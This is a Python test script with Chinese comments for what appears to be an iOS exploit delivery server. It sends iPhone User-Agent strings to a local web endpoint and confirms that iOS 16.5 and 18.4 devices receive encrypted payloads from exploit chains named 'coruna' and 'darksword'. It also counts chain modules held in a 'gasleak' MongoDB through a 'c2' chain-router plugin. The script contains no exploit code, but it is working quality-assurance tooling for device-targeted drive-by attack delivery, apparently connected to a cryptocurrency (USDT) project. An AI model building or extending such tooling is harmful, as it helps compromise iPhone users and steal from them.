# -*- coding: utf-8 -*-
"""
I1-C3 判据：端到端投递 —— 从设备 UA 到载荷清单。

★ 这不是"函数被调用了"，而是【真 HTTP + 真 UA → 真路由 → 真响应形状】。

判据先于实现（判据 9）。本脚本放产物外（_fix_work/），不进 09-docs/cards/（P-4）。

★ 实测得到的三种响应形状（本判据的判定依据）：
    - coruna 路径   : HTTP 200 + octet-stream + 7z 魔数 377abcaf271c（加密载荷）
    - darksword 路径: HTTP 200 + octet-stream + 7z 魔数 377abcaf271c（加密载荷）
    - 不支持路径    : HTTP 200 + application/json + {"unsupported":true,"reason":"no_chain_for_device"}

★ 必须逐次清缓存：routes/config.js 的缓存键**不含 UA**（F1-C11 缺陷），
  否则第一个请求的 UA 会被所有后续请求复用。

用法：
    python verify_i1c3_e2e_payload.py              # 全量
    python verify_i1c3_e2e_payload.py --selftest   # 量尺前置断言（P-5）

退出码：0 = 全绿；非 0 = 有红。
"""
from __future__ import annotations

# ★ X3：本脚本【自带】UTF-8 输出，不依赖调用方设置 PYTHONIOENCODING（P-10）
import os as _os
IOS_ROOT = _os.environ.get("IOS_ROOT", r"E:\ios漏洞")
QIANKE_SRC = _os.environ.get("QIANKE_SRC", r"E:\潜客")
import os as _os
USDT_ROOT = _os.environ.get("USDT_ROOT", _os.path.dirname(_os.path.dirname(_os.path.abspath(__file__))))
import os as _os
import sys as _sys

_os.environ.setdefault("PYTHONIOENCODING", "utf-8")
try:
    _sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    _sys.stderr.reconfigure(encoding="utf-8", errors="replace")
except Exception:
    pass  # 旧版 Python 无 reconfigure 时静默降级
import argparse
import json
import re
import subprocess
import sys
import urllib.error
import urllib.request

API = "http://127.0.0.1:3000"
ENDPOINT = "/details/show.html"
RCLI = [IOS_ROOT + r"\_integration\_fix_work\_toolchain\redis\redis-cli.exe"]
# ★ node 不在 PATH（P-7），必须用绝对路径
NODE_EXE = r"E:\CTF\runtime\node\node.exe"
LOG_CANDIDATES = [
    IOS_ROOT + r"\_integration\_fix_work\_i1c3_ws\_node4.log",
    IOS_ROOT + r"\_integration\_fix_work\_i1c3_ws\_node2.log",
]

CORUNA_ENTRIES = 15
DARKSWORD_ENTRIES = 5

_results = []


def rec(name, ok, detail):
    _results.append({"name": name, "ok": bool(ok), "detail": detail})
    print(f"  [{'PASS' if ok else 'FAIL'}] {name}: {detail}")


def get(path, ua=None, timeout=20):
    req = urllib.request.Request(API + path, method="GET")
    if ua:
        req.add_header("User-Agent", ua)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, (r.headers.get("Content-Type") or ""), r.read()
    except urllib.error.HTTPError as e:
        return e.code, ((e.headers.get("Content-Type") or "") if e.headers else ""), e.read()
    except Exception as e:
        return -1, "", f"EXC:{e}".encode()


def flush_config_cache():
    """清 payload_config:* 缓存（见文件头说明）。"""
    try:
        out = subprocess.run(RCLI + ["-h", "127.0.0.1", "-p", "16379", "KEYS", "payload_config:*"],
                             capture_output=True, text=True, encoding="utf-8",
                             errors="replace").stdout.strip()
        for k in out.splitlines():
            if k.strip():
                subprocess.run(RCLI + ["-h", "127.0.0.1", "-p", "16379", "DEL", k.strip()],
                               capture_output=True)
    except Exception:
        pass


def classify(ctype, raw):
    """按响应形状分类：payload（7z 加密）/ unsupported（JSON）/ unknown。"""
    if "json" in (ctype or ""):
        try:
            j = json.loads(raw.decode("utf-8"))
            if j.get("unsupported"):
                return "unsupported", j
        except Exception:
            pass
        return "json-other", None
    if raw[:6].hex() == "377abcaf271c":
        return "payload", None
    return "unknown", None


def ua_for(major, minor, patch=0):
    v = f"{major}_{minor}" + (f"_{patch}" if patch else "")
    return (f"Mozilla/5.0 (iPhone; CPU iPhone OS {v} like Mac OS X) "
            f"AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1")


def selftest():
    print("=== 量尺前置断言（P-5）===")
    ok = True

    st, ct, raw = get(ENDPOINT, ua=ua_for(16, 5))
    if st == 200:
        print(f"  Node 服务就绪: {ENDPOINT} -> 200 ({len(raw)}B, {ct})")
    else:
        print(f"  [FAIL] Node 服务不可达 ({st})")
        ok = False

    try:
        r = subprocess.run(RCLI + ["-h", "127.0.0.1", "-p", "16379", "PING"],
                           capture_output=True, text=True, encoding="utf-8")
        if "PONG" in (r.stdout or ""):
            print("  Redis 就绪（可清缓存）")
        else:
            print("  [FAIL] Redis 不可用 —— 无法清缓存，判据会受缓存污染")
            ok = False
    except Exception as e:
        print(f"  [FAIL] Redis 调用失败: {e}")
        ok = False

    # ★ 量尺有效性：清缓存后不同 UA 必须可区分
    flush_config_cache()
    _s1, _c1, r1 = get(ENDPOINT, ua=ua_for(16, 5))
    flush_config_cache()
    _s2, _c2, r2 = get(ENDPOINT, ua=ua_for(18, 4))
    flush_config_cache()
    _s3, _c3, r3 = get(ENDPOINT, ua=ua_for(17, 5))
    if not (r1 == r2 == r3):
        print(f"  量尺有效：清缓存后三种 UA 响应互不相同（{len(r1)}/{len(r2)}/{len(r3)} bytes）")
    else:
        print("  [FAIL] 清缓存后三种 UA 仍相同 —— 路由未生效或量尺失效")
        ok = False

    k1, _ = classify(_c1, r1)
    k2, _ = classify(_c2, r2)
    k3, _ = classify(_c3, r3)
    if k1 == "payload" and k2 == "payload" and k3 == "unsupported":
        print("  分类器有效：coruna=payload / darksword=payload / 空白区=unsupported")
    else:
        print(f"  [FAIL] 分类器结果异常: {k1} / {k2} / {k3}")
        ok = False

    print("SELFTEST=OK" if ok else "SELFTEST=BAD")
    return 0 if ok else 2


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--selftest", action="store_true")
    args = ap.parse_args()
    if args.selftest:
        return selftest()

    print("=== I1-C3 端到端投递验证（真 HTTP + 真 UA）===")
    print(f"端点: {API}{ENDPOINT}")
    print("★ 每次请求前清 payload_config 缓存（因缓存键不含 UA —— 见 F1-C11）")
    print("")

    print("路 A：三条 UA 路径的真实响应")
    cases = [
        ("V1 coruna (iOS 16.5)", ua_for(16, 5), "payload"),
        ("V2 darksword (iOS 18.4)", ua_for(18, 4), "payload"),
        ("V3 空白区 (iOS 17.5)", ua_for(17, 5), "unsupported"),
    ]
    got = {}
    for label, ua, expect_kind in cases:
        flush_config_cache()
        st, ct, raw = get(ENDPOINT, ua=ua)
        kind, j = classify(ct, raw)
        got[label] = (st, ct, raw, kind, j)
        rec(f"A {label} -> {expect_kind}", st == 200 and kind == expect_kind,
            f"HTTP={st} {len(raw)}B ct={ct} kind={kind}"
            + (f" body={json.dumps(j, ensure_ascii=False)}" if j else ""))

    k1 = got["V1 coruna (iOS 16.5)"]
    k2 = got["V2 darksword (iOS 18.4)"]
    k3 = got["V3 空白区 (iOS 17.5)"]

    rec("A V1 载荷体非空（7z 加密）", len(k1[2]) > 0, f"{len(k1[2])} bytes")
    rec("A V2 载荷体非空（7z 加密）", len(k2[2]) > 0, f"{len(k2[2])} bytes")

    rec("A V3 空白区为【显式 unsupported】(D-3 要求)",
        k3[3] == "unsupported",
        f"body={json.dumps(k3[4], ensure_ascii=False) if k3[4] else 'n/a'}")
    rec("A V3 响应与 coruna 不同（非静默复用 17.0）", k3[2] != k1[2],
        f"V3={len(k3[2])}B vs coruna={len(k1[2])}B")
    rec("A V3 响应与 darksword 不同", k3[2] != k2[2],
        f"V3={len(k3[2])}B vs darksword={len(k2[2])}B")
    rec("A coruna 与 darksword 载荷体不同", k1[2] != k2[2],
        f"{len(k1[2])}B vs {len(k2[2])}B")

    uniq = len({k1[2], k2[2], k3[2]})
    rec("A 三条路径响应互不相同（数据驱动，未只跑一条）", uniq == 3,
        f"去重后 {uniq}/3 种响应")
    print("")

    print("路 B：真实 Payload 集合的分链计数（契约 C-3）")
    # ★ 直接查 MongoDB 并按 moduleBelongsToChain 过滤 —— 不依赖日志文本
    #   （实测日志 upserted 计数会因进程重启而丢失，Mongo 是唯一真相）
    n1 = n2 = -1
    try:
        node_script = r"""
const m = require('mongoose');
(async () => {
  await m.connect('mongodb://127.0.0.1:27018/gasleak');
  const names = (await m.connection.db.collection('payloads')
    .find({}).project({name:1,_id:0}).toArray()).map(d => d.name);
  const { moduleBelongsToChain } = await import(
    'file:///E:/USDT项目/02-backend-node/src_restored/plugins/c2/services/chain-router.js');
  const coruna = names.filter(n => moduleBelongsToChain(n, 'coruna'));
  const darksword = names.filter(n => moduleBelongsToChain(n, 'darksword'));
  console.log(JSON.stringify({ coruna: coruna.length, darksword: darksword.length }));
  await m.disconnect();
})();
"""
        r = subprocess.run([NODE_EXE, "-e", node_script], capture_output=True, text=True,
                           encoding="utf-8", errors="replace",
                           cwd=USDT_ROOT + r"\02-backend-node", timeout=60)
        m = re.search(r'\{"coruna":(\d+),"darksword":(\d+)\}', r.stdout or "")
        if m:
            n1, n2 = int(m.group(1)), int(m.group(2))
        else:
            print(f"    (node 输出未匹配: {(r.stdout or '')[:120]} err={(r.stderr or '')[:120]})")
    except Exception as e:
        print(f"    (Mongo 查询失败: {e})")

    rec(f"B coruna entries = {CORUNA_ENTRIES}（契约 C-3）", n1 == CORUNA_ENTRIES,
        f"Mongo 过滤结果 = {n1}")
    rec(f"B darksword entries = {DARKSWORD_ENTRIES}（契约 C-3）", n2 == DARKSWORD_ENTRIES,
        f"Mongo 过滤结果 = {n2}")
    print("")

    print("=== 三条路径覆盖率声明（实测）===")
    print("| 路径 | bytes | Content-Type | 分类 |")
    print("|---|---|---|---|")
    for label, _ua, _ in cases:
        st, ct, raw, kind, _j = got[label]
        print(f"| {label} | {len(raw)} | {ct} | {kind} |")
    print("")
    print("★ 未覆盖（按 V0 D-4 登记）：")
    print("  - 真机投递 —— 未在真实 iOS 设备验证载荷到达与执行")
    print("  - 载荷解密后的实际 entries 逐项 —— 仅验形状（7z 魔数 + 非空），未解包核对")

    print("")
    fails = [r for r in _results if not r["ok"]]
    print(f"=== {len(_results) - len(fails)}/{len(_results)} 通过 ===")
    if fails:
        print(f"RESULT=RED  {len(fails)} 项失败:")
        for f in fails:
            print(f"  - {f['name']}: {f['detail']}")
        return 1
    print("RESULT=GREEN  三条 UA 路径可区分、载荷非空、空白区显式不支持")
    return 0


if __name__ == "__main__":
    sys.exit(main())
